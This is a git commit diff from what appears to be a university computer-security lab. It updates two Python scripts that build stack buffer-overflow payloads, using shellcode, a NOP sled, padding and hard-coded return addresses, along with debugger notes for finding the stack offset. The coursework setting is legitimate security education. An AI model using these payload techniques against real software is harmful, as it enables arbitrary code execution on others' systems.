3fab0025444537d8596c05d4bf7e18e59cfd70e9
eecs388 <krachit@umich.edu>
2023-03-28 21:15:02 +0000

    Automatic commit by test script for krachit vkaushik

--- sol2.py
+++ sol2.py
@@ -3,3 +3,6 @@ import sys
 
 execute = shellcode + b'0' * (0x70 - len(shellcode)) + (0xfff6cbfc).to_bytes(4, 'little')
 sys.stdout.buffer.write(execute)
+
+
+# b vulnerable -> run AAAAAAA -> info register ebp -> ebp-0x6c
--- sol6.py
+++ sol6.py
@@ -1,10 +1,3 @@
-# Questions
-# -----------------------------------------------
-# how can i find correct address to use from range of addresses (0-255)
-# instead of using 255 nops, use size of buffer (511 bc both directions)
-# fill entire buffer. definitely a noop instruction
-# otherwise it will crash the program
-
 #buffer a lot bigger than possible offset
 #over jump instead of under jump
 #fill rest of buffer with nops
@@ -13,26 +6,22 @@
 from shellcode import shellcode
 import sys
 
-# Create a large NOP sled
-nop_sled = b'\x90' * 512
-
-# Add the shellcode after the NOP sled
+buffer_size = 1024 + 4 + 4
+nop_sled = b'\x90' * (buffer_size-len(shellcode))
 payload = nop_sled + shellcode
-
-# Calculate the expected buffer size (buf size in vulnerable() + offset for the saved instruction pointer)
-buffer_size = 1024 + 4
-
-# Calculate the padding size
-padding_size = buffer_size - len(payload)
-
-# Add the padding after the shellcode to fill the rest of the buffer
-padding = b'A' * padding_size
-
-# Calculate the approximate return address to jump into the NOP sled (assuming stack address in the middle of NOP sled)
-approx_return_addr = 0xfff6cbfc - (len(nop_sled) // 2)
-
-# Add the return address to the end of the payload
-payload += approx_return_addr.to_bytes(4, 'little')
-
-# Print the payload
+padding = b'FFFF'
+payload += padding + (0xfff6c840).to_bytes(4, 'little')
+#print(len(shellcode))
 sys.stdout.buffer.write(payload)
+
+
+# ebp - 0x408 = 0xfff6cbf8 - 0x408 = 0xfff6c7f0
+"""
+0xfff6c830
+0xfff6c7f0
+0xfff6c7d0
+0xfff6c7a0
+0x08048c39
+0xfff6c840
+0xfff6c760
+"""
